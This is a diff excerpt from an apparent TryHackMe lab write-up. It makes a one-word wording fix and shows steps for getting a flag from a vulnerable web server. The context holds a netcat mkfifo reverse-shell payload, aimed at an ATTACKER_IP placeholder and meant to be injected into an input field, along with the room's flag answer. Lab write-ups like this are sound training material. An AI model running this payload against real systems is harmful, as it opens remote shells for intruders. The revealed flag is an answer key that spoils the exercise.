@@ -643,7 +643,7 @@ let’s get the flag in the format THM{} from the vulnerable web server. Click o
 - ![image](https://github.com/user-attachments/assets/e6ac7f99-fd54-4df8-bdec-9ddd15ca41d2)
 - inject this payload into the input field `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f` change the attack ip to your machine ip and the port to your netcat listener, in my case it is `443`
 - ![image](https://github.com/user-attachments/assets/d9b01975-637b-49ad-9baa-af70e80b4cc1)
-- Once the payload has successfully executed, you'll get a reverse shell. from there navigate to the remote directory `cd /` and cat the `flag.txt` file
+- Once the payload has successfully executed, you'll get a reverse shell. from there navigate to the root directory `cd /` and cat the `flag.txt` file
 - ![image](https://github.com/user-attachments/assets/dc843882-9e71-428e-92b8-8aad7e368cf1)
 
 Ans: ***THM{0f28b3e1b00becf15d01a1151baf10fd713bc625}***
